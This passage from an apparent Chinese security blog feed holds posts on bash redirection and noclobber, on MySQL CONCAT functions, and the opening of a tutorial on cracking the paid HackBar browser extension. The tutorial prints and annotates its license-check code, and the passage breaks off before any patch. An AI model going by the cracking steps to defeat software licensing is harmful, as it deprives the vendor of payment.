<blockquote>
<p>注意：</p>
<ul>
<li>结尾的delimiter 一定要顶格写，前面不能有任何字符，后面也不能有任何字符，包括空格和 tab 缩进</li>
<li>开始的delimiter前后的空格会被忽略掉</li>
</ul>
</blockquote>
<h2 id="有关覆盖">有关覆盖</h2>
<p>如果我们用 <code>set -o noclobber</code> 设置bash，那bash将不会覆盖任何已经存在的文件，但是我们可以通过 <code>&gt;|</code> 绕过这个限制</p>
<p><strong>先来看一下默认的情况</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">root@ubuntu:~# <span class="nv">testfile</span><span class="o">=</span><span class="k">$(</span>mktemp /tmp/testNoClobberDate-XXXXXX<span class="k">)</span>
root@ubuntu:~# date &gt; <span class="nv">$testfile</span> <span class="p">;</span> cat <span class="nv">$testfile</span>
Tue <span class="m">24</span> Mar <span class="m">2020</span> 05:05:53 PM CST
root@ubuntu:~# date &gt; <span class="nv">$testfile</span> <span class="p">;</span> cat <span class="nv">$testfile</span>
Tue <span class="m">24</span> Mar <span class="m">2020</span> 05:05:56 PM CST
root@ubuntu:~# date &gt; <span class="nv">$testfile</span> <span class="p">;</span> cat <span class="nv">$testfile</span>
Tue <span class="m">24</span> Mar <span class="m">2020</span> 05:06:13 PM CST
</code></pre></td></tr></table>
</div>
</div><p>如预期的一样，每一次重定向都覆盖了原文件</p>
<p><strong>下面我们设置 <code>noclobber</code> 标志</strong></p>
<p><code>set -o noclobber</code></p>
<p>然后重复上面的操作试一下</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">root@ubuntu:~# date &gt; <span class="nv">$testfile</span> <span class="p">;</span> cat <span class="nv">$testfile</span>
bash: /tmp/testNoClobberDate-yKVkaY: cannot overwrite existing file
Tue <span class="m">24</span> Mar <span class="m">2020</span> 05:06:13 PM CST
root@ubuntu:~# date &gt; <span class="nv">$testfile</span> <span class="p">;</span> cat <span class="nv">$testfile</span>
bash: /tmp/testNoClobberDate-yKVkaY: cannot overwrite existing file
Tue <span class="m">24</span> Mar <span class="m">2020</span> 05:06:13 PM CST
</code></pre></td></tr></table>
</div>
</div><p>我们看到了bash的提示，不能覆盖已存在的文件，实际结果也是一样</p>
<p>如何进行绕过呢? 我们来试一下用 <code>&gt;|</code> 代替 <code>&gt;</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">root@ubuntu:~# date &gt;<span class="p">|</span> <span class="nv">$testfile</span> <span class="p">;</span> cat <span class="nv">$testfile</span>
Tue <span class="m">24</span> Mar <span class="m">2020</span> 05:10:45 PM CST
root@ubuntu:~# date &gt;<span class="p">|</span> <span class="nv">$testfile</span> <span class="p">;</span> cat <span class="nv">$testfile</span>
Tue <span class="m">24</span> Mar <span class="m">2020</span> 05:10:49 PM CST
</code></pre></td></tr></table>
</div>
</div><p>我们发现此时可以覆盖已经存在的文件，我们查看一下目前的设置</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">root@ubuntu:~# <span class="nb">set</span> -o <span class="p">|</span> grep noclobber
noclobber       on
</code></pre></td></tr></table>
</div>
</div><p><code>noclobber</code> 的确是开启的，所以 <code>&gt;|</code> 的确可以绕过这一限制</p>
<p>使用 <code>set +o noclobber</code> 关闭这个限制，防止对我们后面的使用造成影响</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">root@ubuntu:~# <span class="nb">set</span> +o noclobber
root@ubuntu:~# <span class="nb">set</span> -o <span class="p">|</span> grep noclobber
noclobber       off
root@ubuntu:~# rm <span class="nv">$testfile</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="其他的小点">其他的小点</h2>
<h3 id="重定向到一处">重定向到一处</h3>
<p>如果我们要将 <code>stdout</code> 和 <code>stderr</code> 重定向到同一个地方，该怎么写呢？</p>
<p>下面两种哪种是对的？</p>
<ol>
<li><code>ls -ld /tmp /tnt 2&gt;&amp;1 1&gt;a.txt</code></li>
<li><code>ls -ld /tmp /tnt 1&gt;b.txt 2&gt;&amp;1</code></li>
</ol>
<p>验证一下</p>
<p><strong>第一种写法</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">root@ubuntu:~# ls -ld /tmp /tnt 2&gt;<span class="p">&amp;</span><span class="m">1</span> 1&gt;a.txt
ls: cannot access <span class="s1">&#39;/tnt&#39;</span>: No such file or directory
root@ubuntu:~# cat a.txt
drwxrwxrwt <span class="m">1</span> root root <span class="m">4096</span> Mar <span class="m">24</span> 17:15 /tmp
</code></pre></td></tr></table>
</div>
</div><p><strong>第二种写法</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">root@ubuntu:~# ls -ld /tmp /tnt 1&gt;b.txt 2&gt;<span class="p">&amp;</span><span class="m">1</span>
root@ubuntu:~# cat b.txt
ls: cannot access <span class="s1">&#39;/tnt&#39;</span>: No such file or directory
drwxrwxrwt <span class="m">1</span> root root <span class="m">4096</span> Mar <span class="m">24</span> 17:15 /tmp
</code></pre></td></tr></table>
</div>
</div><p>我们可以看到第二种写法是正确的</p>
<p>同理，下面这种写法也正确</p>
<p><code>ls -ld /tmp /tnt 2&gt;b.txt 1&gt;&amp;2</code></p>
<h3 id="套个娃a">套个娃a</h3>
<p>来点奇葩的，如果我们将 <code>stderr</code> 重定向到 <code>stdout</code>, 同时又将 <code>stdout</code> 重定向到 <code>stderr</code> 会发生什么？</p>
<p>如此套娃会不会导致回环卡死？</p>
<p>试一下</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">root@ubuntu:~# ls -ld /tmp /tnt 2&gt;<span class="p">&amp;</span><span class="m">1</span> 1&gt;<span class="p">&amp;</span><span class="m">2</span>  <span class="p">|</span> sed -e s/^/++/
++ls: cannot access <span class="s1">&#39;/tnt&#39;</span>: No such file or directory
++drwxrwxrwt <span class="m">1</span> root root <span class="m">4096</span> Mar <span class="m">24</span> 17:15 /tmp
</code></pre></td></tr></table>
</div>
</div><p>我们发现都会从标准输出出来</p>
<p>反过来呢？</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">root@ubuntu:~# ls -ld /tmp /tnt 1&gt;<span class="p">&amp;</span><span class="m">2</span> 2&gt;<span class="p">&amp;</span><span class="m">1</span>  <span class="p">|</span> sed -e s/^/++/
ls: cannot access <span class="s1">&#39;/tnt&#39;</span>: No such file or directory
drwxrwxrwt <span class="m">1</span> root root <span class="m">4096</span> Mar <span class="m">24</span> 17:15 /tmp
</code></pre></td></tr></table>
</div>
</div><p>我们发现都没有从标准输出出来，都是从标准错误输出出来的</p>
<blockquote>
<p>也就是说 <code>a&gt;&amp;b b&gt;&amp;a</code> 这种套娃写法中， b才是出口</p>
</blockquote>
<h2 id="阅读更多内容">阅读更多内容</h2>
<p>如果你想了解功能，通过下面的命令查看官方文档吧</p>
<p><code>man -Len -Pless\ +/^REDIRECTION bash</code></p>
<p>本文的参考资料： <a href="https://stackoverflow.com/questions/818255/in-the-shell-what-does-21-mean" target="_blank" rel="noopener noreffer">stack overflow</a></p>
]]></description></item><item><title>MySQL中几个concat的用法与区别</title><link>https://lgf.im/posts/security/web-security/mysql-concat-concat-ws-group-concat/</link><pubDate>Sun, 22 Mar 2020 18:23:34 +0000</pubDate><author>作者</author><guid>https://lgf.im/posts/security/web-security/mysql-concat-concat-ws-group-concat/</guid><description><![CDATA[<h2 id="讲解与示例">讲解与示例</h2>
<h3 id="concatstr1-str2-">CONCAT(str1, str2, &hellip;)</h3>
<ol>
<li>返回结果为连接参数产生的字符串。如有任何一个参数为NULL ，则返回值为 NULL</li>
<li>参数可以是字段名或具体值</li>
</ol>
<p>注意：</p>
<ol>
<li>如果所有参数均为非二进制字符串，则结果为非二进制字符串</li>
<li>如果自变量中含有任一二进制字符串，则结果为一个二进制字符串</li>
<li>一个数字参数被转化为与之相等的二进制字符串格式</li>
<li>若要避免这种情况，可使用显式类型 cast, 例如： <code>SELECT CONCAT(CAST(int_col AS CHAR), char_col)</code></li>
</ol>
<h4 id="mysql的concat函数可以连接一个或者多个字符串">MySQL的concat函数可以连接一个或者多个字符串</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">mysql&gt; <span class="k">select</span> concat<span class="o">(</span><span class="s1">&#39;10&#39;</span><span class="o">)</span><span class="p">;</span>
+--------------+
<span class="p">|</span> concat<span class="o">(</span><span class="s1">&#39;10&#39;</span><span class="o">)</span> <span class="p">|</span>
+--------------+
<span class="p">|</span> <span class="m">10</span>   <span class="p">|</span>
+--------------+
<span class="m">1</span> row in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
mysql&gt; <span class="k">select</span> concat<span class="o">(</span><span class="s1">&#39;11&#39;</span>,<span class="s1">&#39;22&#39;</span>,<span class="s1">&#39;33&#39;</span><span class="o">)</span><span class="p">;</span>
+------------------------+
<span class="p">|</span> concat<span class="o">(</span><span class="s1">&#39;11&#39;</span>,<span class="s1">&#39;22&#39;</span>,<span class="s1">&#39;33&#39;</span><span class="o">)</span> <span class="p">|</span>
+------------------------+
<span class="p">|</span> <span class="m">112233</span> <span class="p">|</span>
+------------------------+
<span class="m">1</span> row in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
</code></pre></td></tr></table>
</div>
</div><h4 id="mysql的concat函数在连接字符串的时候只要其中一个是null那么将返回null">MySQL的concat函数在连接字符串的时候，只要其中一个是NULL,那么将返回NULL</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">mysql&gt; <span class="k">select</span> concat<span class="o">(</span><span class="s1">&#39;11&#39;</span>,<span class="s1">&#39;22&#39;</span>,null<span class="o">)</span><span class="p">;</span>
+------------------------+
<span class="p">|</span> concat<span class="o">(</span><span class="s1">&#39;11&#39;</span>,<span class="s1">&#39;22&#39;</span>,null<span class="o">)</span> <span class="p">|</span>
+------------------------+
<span class="p">|</span> NULL   <span class="p">|</span>
+------------------------+
<span class="m">1</span> row in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="concat_wsseparatorstr1str2">CONCAT_WS(separator,str1,str2,…)</h3>
<p>CONCAT_WS() 代表 CONCAT With Separator ，是CONCAT()的特殊形式。第一个参数是其它参数的分隔符。分隔符的位置放在要连接的两个字符串之间。分隔符可以是一个字符串，也可以是其它参数。</p>
<p>注意：</p>
<ol>
<li>参数可以是字段名或具体值</li>
<li>如果分隔符为 NULL，则结果为 NULL。函数会忽略任何分隔符参数后的 NULL 值。（只保留非空值）</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">mysql&gt; <span class="k">select</span> concat_ws<span class="o">(</span><span class="s1">&#39;&#39;</span>,<span class="s1">&#39;&#39;</span>,<span class="s1">&#39;&#39;</span>,<span class="s1">&#39;33&#39;</span><span class="o">)</span><span class="p">;</span>
+--------------------------+
<span class="p">|</span> concat_ws<span class="o">(</span><span class="s1">&#39;&#39;</span>,<span class="s1">&#39;&#39;</span>,<span class="s1">&#39;&#39;</span>,<span class="s1">&#39;33&#39;</span><span class="o">)</span> <span class="p">|</span>
+--------------------------+
<span class="p">|</span> <span class="m">33</span>                       <span class="p">|</span>
+--------------------------+
<span class="m">1</span> row in <span class="nb">set</span> <span class="o">(</span>0.04 sec<span class="o">)</span>
</code></pre></td></tr></table>
</div>
</div><h4 id="如连接后以逗号分隔">如连接后以逗号分隔</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">mysql&gt; <span class="k">select</span> concat_ws<span class="o">(</span><span class="s1">&#39;,&#39;</span>,<span class="s1">&#39;11&#39;</span>,<span class="s1">&#39;22&#39;</span>,<span class="s1">&#39;33&#39;</span><span class="o">)</span><span class="p">;</span>
+-------------------------------+
<span class="p">|</span> concat_ws<span class="o">(</span><span class="s1">&#39;,&#39;</span>,<span class="s1">&#39;11&#39;</span>,<span class="s1">&#39;22&#39;</span>,<span class="s1">&#39;33&#39;</span><span class="o">)</span> <span class="p">|</span>
+-------------------------------+
<span class="p">|</span> 11,22,33 <span class="p">|</span>
+-------------------------------+
<span class="m">1</span> row in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
</code></pre></td></tr></table>
</div>
</div><h4 id="和mysql中concat函数不同的是-concat_ws函数在执行的时候不会因为null值而返回null">和MySQL中concat函数不同的是, concat_ws函数在执行的时候,不会因为NULL值而返回NULL</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">mysql&gt; <span class="k">select</span> concat_ws<span class="o">(</span><span class="s1">&#39;,&#39;</span>,<span class="s1">&#39;11&#39;</span>,<span class="s1">&#39;22&#39;</span>,NULL<span class="o">)</span><span class="p">;</span>
+-------------------------------+
<span class="p">|</span> concat_ws<span class="o">(</span><span class="s1">&#39;,&#39;</span>,<span class="s1">&#39;11&#39;</span>,<span class="s1">&#39;22&#39;</span>,NULL<span class="o">)</span> <span class="p">|</span>
+-------------------------------+
<span class="p">|</span> 11,22 <span class="p">|</span>
+-------------------------------+
<span class="m">1</span> row in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="group_concat-函数">GROUP_CONCAT() 函数</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">group_concat</span><span class="p">([</span><span class="k">DISTINCT</span><span class="p">]</span> <span class="err">要连接的字段</span> <span class="p">[</span><span class="k">Order</span> <span class="k">BY</span> <span class="k">ASC</span><span class="o">/</span><span class="k">DESC</span> <span class="err">排序字段</span><span class="p">]</span> <span class="p">[</span><span class="n">Separator</span> <span class="err">‘分隔符’</span><span class="p">])</span>
</code></pre></td></tr></table>
</div>
</div><h4 id="基本查询">基本查询</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">mysql&gt; <span class="k">select</span> * from aa<span class="p">;</span>
+------+------+
<span class="p">|</span> id<span class="p">|</span> name <span class="p">|</span>
+------+------+
<span class="p">|</span><span class="m">1</span> <span class="p">|</span> 10<span class="p">|</span>
<span class="p">|</span><span class="m">1</span> <span class="p">|</span> 20<span class="p">|</span>
<span class="p">|</span><span class="m">1</span> <span class="p">|</span> 20<span class="p">|</span>
<span class="p">|</span><span class="m">2</span> <span class="p">|</span> 20<span class="p">|</span>
<span class="p">|</span><span class="m">3</span> <span class="p">|</span> <span class="m">200</span>   <span class="p">|</span>
<span class="p">|</span><span class="m">3</span> <span class="p">|</span> <span class="m">500</span>   <span class="p">|</span>
+------+------+
<span class="m">6</span> rows in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
</code></pre></td></tr></table>
</div>
</div><h4 id="以id分组把name字段的值打印在一行逗号分隔默认">以id分组，把name字段的值打印在一行，逗号分隔(默认)</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">mysql&gt; <span class="k">select</span> id,group_concat<span class="o">(</span>name<span class="o">)</span> from aa group by id<span class="p">;</span>
+------+--------------------+
<span class="p">|</span> id<span class="p">|</span> group_concat<span class="o">(</span>name<span class="o">)</span> <span class="p">|</span>
+------+--------------------+
<span class="p">|</span><span class="m">1</span> <span class="p">|</span> 10,20,20<span class="p">|</span>
<span class="p">|</span><span class="m">2</span> <span class="p">|</span> <span class="m">20</span> <span class="p">|</span>
<span class="p">|</span><span class="m">3</span> <span class="p">|</span> 200,500<span class="p">|</span>
+------+--------------------+
<span class="m">3</span> rows in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
</code></pre></td></tr></table>
</div>
</div><h4 id="以id分组把去冗余的name字段的值打印在一行逗号分隔">以id分组，把去冗余的name字段的值打印在一行，逗号分隔</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">mysql&gt; <span class="k">select</span> id,group_concat<span class="o">(</span>distinct name<span class="o">)</span> from aa group by id<span class="p">;</span>
+------+-----------------------------+
<span class="p">|</span> id<span class="p">|</span> group_concat<span class="o">(</span>distinct name<span class="o">)</span> <span class="p">|</span>
+------+-----------------------------+
<span class="p">|</span><span class="m">1</span> <span class="p">|</span> 10,20<span class="p">|</span>
<span class="p">|</span><span class="m">2</span> <span class="p">|</span> <span class="m">20</span>   <span class="p">|</span>
<span class="p">|</span><span class="m">3</span> <span class="p">|</span> 200,500 <span class="p">|</span>
+------+-----------------------------+
<span class="m">3</span> rows in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
</code></pre></td></tr></table>
</div>
</div><h4 id="以id分组把name字段的值打印在一行逗号分隔以name排倒序">以id分组，把name字段的值打印在一行，逗号分隔，以name排倒序</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">mysql&gt; <span class="k">select</span> id,group_concat<span class="o">(</span>name order by name desc<span class="o">)</span> from aa group by id<span class="p">;</span>
+------+---------------------------------------+
<span class="p">|</span> id<span class="p">|</span> group_concat<span class="o">(</span>name order by name desc<span class="o">)</span> <span class="p">|</span>
+------+---------------------------------------+
<span class="p">|</span><span class="m">1</span> <span class="p">|</span> 20,20,10   <span class="p">|</span>
<span class="p">|</span><span class="m">2</span> <span class="p">|</span> 20<span class="p">|</span>
<span class="p">|</span><span class="m">3</span> <span class="p">|</span> 500,200<span class="p">|</span>
+------+---------------------------------------+
<span class="m">3</span> rows in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="区别">区别</h2>
<p><a href="https://stackoverflow.com/questions/11889391/difference-between-group-concat-and-concat-ws">https://stackoverflow.com/questions/11889391/difference-between-group-concat-and-concat-ws</a></p>
<h3 id="concat_ws">concat_ws</h3>
<p><a href="http://www.w3resource.com/mysql/string-functions/mysql-concat_ws-function.php">http://www.w3resource.com/mysql/string-functions/mysql-concat_ws-function.php</a></p>
<p></p>
<h3 id="group_concat">group_concat</h3>
<p><a href="http://www.w3resource.com/mysql/aggregate-functions-and-grouping/aggregate-functions-and-grouping-group_concat.php">http://www.w3resource.com/mysql/aggregate-functions-and-grouping/aggregate-functions-and-grouping-group_concat.php</a></p>
<p></p>
]]></description></item><item><title>HackBar破解</title><link>https://lgf.im/posts/security/web-security/hack-hackbar/</link><pubDate>Sun, 22 Mar 2020 10:11:42 +0000</pubDate><author>作者</author><guid>https://lgf.im/posts/security/web-security/hack-hackbar/</guid><description><![CDATA[<h2 id="前言">前言</h2>
<p>相信很多研究安全或者打CTF的朋友都在使用HackBar，在浏览器中使用HackBar构造并发送请求非常方便，特别是测试sql注入和xss等常见漏洞。</p>
<p>但是HackBar是收费软件，在其 <a href="https://hackbar.site/" target="_blank" rel="noopener noreffer">官网</a> 上，价格由3刀到89刀不等。很多安全研究人员会选择购买89刀的10年证书，但是对于学生来说，短期的一个月1刀的短期价格对于这样一个浏览器插件来说还是比较贵的。</p>
<p></p>
<p>考虑到浏览器扩展插件的逻辑代码都是js代码，并且大部分工具类插件的代码都存放在本地，所以破解这类软件变得非常简单。</p>
<p>未破解前的hackbar是这样的，按钮没法用，显示一个红框</p>
<p></p>
<p>下面我将以Chrome浏览器为例，对HackBar插件进行破解。</p>
<h2 id="破解插件">破解插件</h2>
<h3 id="找到插件路径">找到插件路径</h3>
<p>首先我们需要在官网上找到插件的安装地址并进行安装</p>
<p></p>
<p>安装后插件会存放在我们电脑的本地</p>
<p>在chrome中打开 <a href="chrome://version/" target="_blank" rel="noopener noreffer">version</a> 页面，可以在 <code>个人资料路径</code> 位置找到Chrome浏览器数据的存放位置</p>
<p></p>
<p>我们在文件管理器中打开这个路径，找到里面的<code>Extension</code>目录，这个目录里面就存放了我们的所有扩展插件</p>
<p></p>
<p>我们可以在扩展程序界面看到所有插件的ID，找到HackBar的ID，然后从Extension目录中找到这个目录，进入后就是HackBar的插件目录</p>
<h3 id="分析授权验证">分析授权验证</h3>
<p>我们先将插件这个目录复制出来，然后用编辑器打开，其中授权验证相关代码在 <code>theme\js\hackbar-panel.js</code> 这个js文件中</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="c1">// 授权验证失败
</span><span class="c1"></span><span class="kd">function</span> <span class="nx">disable_hackbar</span><span class="p">(</span><span class="nx">message</span><span class="o">=</span><span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">// 将hidden属性移除，就会显示输入证书的红框
</span><span class="c1"></span>    <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#alert-license&#39;</span><span class="p">).</span><span class="nx">removeClass</span><span class="p">(</span><span class="s1">&#39;hidden&#39;</span><span class="p">);</span>
    <span class="c1">// 如果有消息，就在证书那个红框显示出来
</span><span class="c1"></span>    <span class="k">if</span><span class="p">(</span><span class="nx">message</span><span class="p">){</span>
        <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#alert-license span&#39;</span><span class="p">).</span><span class="nx">text</span><span class="p">(</span><span class="nx">message</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="c1">// 标记证书无效
</span><span class="c1"></span>    <span class="nx">license_ok</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// 从chrome本地存储中获取都license内容
</span><span class="c1"></span><span class="nx">chrome</span><span class="p">.</span><span class="nx">storage</span><span class="p">.</span><span class="nx">local</span><span class="p">.</span><span class="nx">get</span><span class="p">([</span><span class="s1">&#39;license&#39;</span><span class="p">],</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">result</span><span class="p">)</span> <span class="p">{</span>
    <span class="kr">const</span> <span class="nx">license</span> <span class="o">=</span> <span class="nx">result</span><span class="p">.</span><span class="nx">license</span><span class="p">;</span>
    <span class="c1">// 如果证书内容存在
</span><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nx">license</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">//通过链接谷歌服务器检查网络情况
</span><span class="c1"></span>        <span class="nx">fetch</span><span class="p">(</span><span class="s2">&#34;https://google.com&#34;</span><span class="p">)</span>
            <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">response</span><span class="p">)</span> <span class="p">{</span>
                <span class="c1">// 从证书服务器检查证书
</span><span class="c1"></span>                <span class="nx">fetch</span><span class="p">(</span><span class="nx">license_server</span> <span class="o">+</span> <span class="s2">&#34;/&#34;</span> <span class="o">+</span> <span class="nx">license</span><span class="p">)</span>
                    <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">response</span><span class="p">)</span> <span class="p">{</span>
                        <span class="k">return</span> <span class="nx">response</span><span class="p">.</span><span class="nx">json</span><span class="p">();</span>
                    <span class="p">})</span>
                    <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
                        <span class="c1">// 无效的证书会返回
</span><span class="c1"></span>                        <span class="c1">// {&#34;pong&#34;:false,&#34;message&#34;:&#34;License is invalid&#34;}
